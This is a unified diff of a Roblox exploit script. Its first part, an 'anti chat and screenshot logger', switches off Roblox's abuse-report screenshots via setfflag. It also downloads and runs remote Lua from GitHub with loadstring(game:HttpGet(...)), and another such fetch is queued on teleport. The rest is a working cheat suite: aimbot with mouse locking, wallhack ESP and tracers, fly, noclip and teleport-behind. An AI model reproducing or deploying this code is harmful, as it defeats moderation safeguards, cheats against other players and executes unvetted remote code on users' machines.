@@ -1,9 +1,111 @@
 -- BEGIN SCRIPT ONE (Anti Chat & Screenshot Logger)
--- (All of this section unchanged, keeping as in your script 2...)
+-- Wait for the game to finish loading
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
 
--- ...[Anti Chat & Screenshot Logger code unchanged]...
+-- Services
+local Players           = game:GetService("Players")
+local TextChatService   = game:GetService("TextChatService")
+local StarterGui        = game:GetService("StarterGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui           = game:GetService("CoreGui")
 
+-- Local player & GUI
+local lp        = Players.LocalPlayer
+local playerGui = lp:WaitForChild("PlayerGui")
+
+print("Loading Vadrift's Anti Chat & Screenshot Logger…")
+
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+    local startTime = tick()
+    task.wait(0.21)
+
+    -- Helper to show a notification
+    local function showNotification(title, description, iconId)
+        pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title    = title;
+                Text     = description;
+                Icon     = iconId;
+                Duration = 15;
+            })
+        end)
+    end
+
+    -- Prevent double‑loading
+    if _G.VadriftsACLLoaded then
+        showNotification("Vadrifts ACL", "Already loaded!", "rbxassetid://2541869220")
+        print("Anti Chat Logger already loaded!")
+        return
+    end
+    _G.VadriftsACLLoaded = true
+
+    showNotification(
+        "Vadrifts ACL",
+        string.format("Loaded in %.2f seconds!", tick() - startTime),
+        "rbxassetid://2541869220"
+    )
+    print(string.format("Anti Chat Logger initialized in %.2f seconds!", tick() - startTime))
+
+    -- Disable Roblox’s built‑in screenshot reports
+    if setfflag then
+        pcall(function()
+            setfflag("AbuseReportScreenshot",           "False")
+            setfflag("AbuseReportScreenshotPercentage", "0")
+        end)
+    end
+
+    -- Optional: re‑show chat UI if hidden
+    task.spawn(function()
+        repeat
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+            task.wait()
+        until StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Chat)
+    end)
+
+    -- Optional: detect when user sends an emote ("/e ...") – no spam
+    do
+        local function setupChatHook()
+            local chatBar
+            local chatFrame = playerGui:FindFirstChild("Chat")
+            if chatFrame then
+                chatBar = chatFrame:FindFirstChild("ChatBar", true)
+            end
+            if not chatBar then
+                local container = CoreGui:FindFirstChild("TextBoxContainer", true)
+                if container then
+                    chatBar = container:FindFirstChild("TextBox")
+                end
+            end
+            if not chatBar then
+                warn("❌ Could not find chat bar for emoting hook.")
+                return
+            end
+            chatBar.FocusLost:Connect(function(enterPressed)
+                if enterPressed then
+                    local msg = chatBar.Text:lower()
+                    if msg:match("^/e%s+[%w_]+") then
+                        -- Emote detected; no further action to avoid spam
+                    end
+                end
+            end)
+        end
+
+        setupChatHook()
+    end
+
+else
+    -- Fallback: load external ACL if TextChatService isn't in use
+    if not pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/main/Anthony's%20ACL"))()
+    end) then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/main/Anthony's%20ACL"))()
+    end
+    print("Anti Chat & Screenshot Logger (legacy) loaded.")
+end
 -- END SCRIPT ONE
+
 
 -- BEGIN SCRIPT TWO (Fly / ESP / Teleport-Behind)
 queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/RamonNudles/rrtest2/refs/heads/index/smth.lua"))()')
@@ -48,7 +150,6 @@ local function hookCharacter(char)
     enforceSpeed(h)
 
     local hrp = char:WaitForChild("HumanoidRootPart", 5)
-    -- clean up any old fly parts
     if hrp:FindFirstChild("FlyGyro") then hrp.FlyGyro:Destroy() end
     if hrp:FindFirstChild("FlyVelocity") then hrp.FlyVelocity:Destroy() end
 
@@ -98,7 +199,6 @@ local AimConfig = {
     WallCheck = false,
 }
 
--- Valid target check
 local function isValidTarget(player)
     if player == LocalPlayer then return false end
     if not player.Character then return false end
@@ -107,73 +207,56 @@ local function isValidTarget(player)
     return true
 end
 
--- Get the aimbot part (head by default)
 local function getTargetPart(character)
     return character and character:FindFirstChild(AimConfig.Part)
 end
 
--- Wall check
 local function isVisible(targetPlayer)
     local character = targetPlayer.Character
     if not character then return false end
     local targetPart = getTargetPart(character)
     if not targetPart then return false end
-    local targetPos = targetPart.Position
     local origin = Camera.CFrame.Position
-    local direction = (targetPos - origin).Unit * 1000
+    local direction = (targetPart.Position - origin).Unit * 1000
     local rayParams = RaycastParams.new()
     rayParams.FilterType = Enum.RaycastFilterType.Blacklist
-    rayParams.FilterDescendantsInstances = {LocalPlayer.Character}
+    rayParams.FilterDescendantsInstances = { LocalPlayer.Character }
     rayParams.IgnoreWater = true
     local result = workspace:Raycast(origin, direction, rayParams)
-    if result and result.Instance then
-        if not character:IsAncestorOf(result.Instance) then
-            return false
-        end
+    if result and result.Instance and not character:IsAncestorOf(result.Instance) then
+        return false
     end
     return true
 end
 
--- Get closest player in FOV
 local function getClosestPlayerInFOV()
-    local closestPlayer = nil
-    local shortestDistance = AimConfig.FOV
+    local closest, shortest = nil, AimConfig.FOV
     for _, player in pairs(Players:GetPlayers()) do
         if isValidTarget(player) then
-            local targetPart = getTargetPart(player.Character)
-            if targetPart then
-                if not AimConfig.WallCheck or isVisible(player) then
-                    local screenPoint = Camera:WorldToScreenPoint(targetPart.Position)
-                    local distance = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(screenPoint.X, screenPoint.Y)).Magnitude
-                    if distance < shortestDistance then
-                        closestPlayer = player
-                        shortestDistance = distance
-                    end
+            local part = getTargetPart(player.Character)
+            if part and (not AimConfig.WallCheck or isVisible(player)) then
+                local screen = Camera:WorldToScreenPoint(part.Position)
+                local dist = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(screen.X, screen.Y)).Magnitude
+                if dist < shortest then
+                    closest, shortest = player, dist
                 end
             end
         end
     end
-    return closestPlayer
+    return closest
 end
 
--- Check if locked target is valid
 local function isLockedTargetValid()
-    local target = AimConfig.LockOnTarget
-    if not target then return false end
-    if not target.Parent then return false end
-    if not isValidTarget(target) then return false end
-    if not getTargetPart(target.Character) then return false end
-    return true
+    local t = AimConfig.LockOnTarget
+    return t and t.Parent and isValidTarget(t) and getTargetPart(t.Character)
 end
 
 local RightMouseDown = false
-
 UserInputService.InputBegan:Connect(function(input, processed)
     if not processed and input.UserInputType == Enum.UserInputType.MouseButton2 then
         RightMouseDown = true
     end
 end)
-
 UserInputService.InputEnded:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton2 then
         RightMouseDown = false
@@ -184,24 +267,18 @@ end)
 RunService.RenderStepped:Connect(function()
     if not AimConfig.Enabled or not RightMouseDown then return end
     if AimConfig.LockOnTarget and isLockedTargetValid() then
-        local targetPart = getTargetPart(AimConfig.LockOnTarget.Character)
-        local targetPosition = Camera:WorldToScreenPoint(targetPart.Position)
-        if targetPosition.Z > 0 then
-            local mousePos = Vector2.new(Mouse.X, Mouse.Y)
-            local aimPos = Vector2.new(targetPosition.X, targetPosition.Y)
-            local moveDelta = (aimPos - mousePos) * AimConfig.Sensitivity
-            mousemoverel(moveDelta.X, moveDelta.Y)
+        local tp = getTargetPart(AimConfig.LockOnTarget.Character)
+        local screen = Camera:WorldToScreenPoint(tp.Position)
+        if screen.Z > 0 then
+            local delta = (Vector2.new(screen.X, screen.Y) - Vector2.new(Mouse.X, Mouse.Y)) * AimConfig.Sensitivity
+            mousemoverel(delta.X, delta.Y)
         end
     else
-        local newTarget = getClosestPlayerInFOV()
-        if newTarget then
-            AimConfig.LockOnTarget = newTarget
-        end
+        AimConfig.LockOnTarget = getClosestPlayerInFOV()
     end
 end)
 
 -- ─── ESP & Tracers & Noclip ───────────────────────────────────────────────
-
 local Tracers             = {}
 local MAX_TRACER_DISTANCE = 1200
 
@@ -228,7 +305,7 @@ local function CreateHighlight(c)
     h.OutlineTransparency= 1
 end
 
-local function CreateNametag(p,c)
+local function CreateNametag(p, c)
     if c:FindFirstChild("ESPNameTag") then return end
     local head = c:FindFirstChild("Head")
     if not head then return end
@@ -242,7 +319,7 @@ local function CreateNametag(p,c)
     lbl.Size                   = UDim2.fromScale(1,1)
     lbl.BackgroundTransparency = 1
     lbl.Font                   = Enum.Font.SourceSansBold
-    lbl.TextColor3             = Color3.fromRGB(0,255,0)
+    lbl.TextColor3             = Color3.new(1,1,1)
     lbl.TextScaled             = false
     lbl.TextSize               = 30
     if Config.HPESP then
@@ -262,19 +339,18 @@ local function RefreshESP()
     local origin = GetTracerOrigin()
     for _, p in ipairs(Players:GetPlayers()) do
         if p ~= LocalPlayer then
-            local c = p.Character
+            local c    = p.Character
             local root = c and c:FindFirstChild("HumanoidRootPart")
-            local h = c and c:FindFirstChildOfClass("Humanoid")
-            local alive = root and h and h.Health>0
-            if Config.ShowESP and alive then
-                local pos,on = Camera:WorldToViewportPoint(root.Position)
-                local dist = (root.Position - Camera.CFrame.Position).Magnitude
+            local h    = c and c:FindFirstChildOfClass("Humanoid")
+            if root and h and h.Health>0 and Config.ShowESP then
+                local pos, on = Camera:WorldToViewportPoint(root.Position)
+                local dist     = (root.Position - Camera.CFrame.Position).Magnitude
                 if on and dist<MAX_TRACER_DISTANCE then
                     local T = Tracers[p] or CreateTracer()
                     Tracers[p] = T
                     T.Visible = true
                     T.From    = origin
-                    T.To      = Vector2.new(pos.X,pos.Y)
+                    T.To      = Vector2.new(pos.X, pos.Y)
                 elseif Tracers[p] then
                     Tracers[p].Visible = false
                 end
@@ -284,7 +360,7 @@ local function RefreshESP()
                 if Tracers[p] then Tracers[p].Visible = false end
                 if c then
                     if c:FindFirstChild("ESPHighlight") then c.ESPHighlight:Destroy() end
-                    if c:FindFirstChild("ESPNameTag") then c.ESPNameTag:Destroy() end
+                    if c:FindFirstChild("ESPNameTag")  then c.ESPNameTag:Destroy() end
                 end
             end
         end
@@ -299,7 +375,9 @@ Players.PlayerRemoving:Connect(function(p)
 end)
 
 RunService.RenderStepped:Connect(function()
-    if Config.ShowESP then RefreshESP() else 
+    if Config.ShowESP then
+        RefreshESP()
+    else
         for _, L in pairs(Tracers) do L:Remove() end
         Tracers = {}
     end
@@ -356,5 +434,5 @@ RunService.Heartbeat:Connect(function()
     end
 end)
 
-print("haxegon_static loaded: AimLock, WalkSpeed, Fly ON, Noclip, ESP, Teleport-Behind [O]")
+print("haxegon_static loaded: Anti‑Chat Logger, AimLock, WalkSpeed, Fly ON, Noclip, ESP, Teleport-Behind [O]")
 -- END SCRIPT TWO
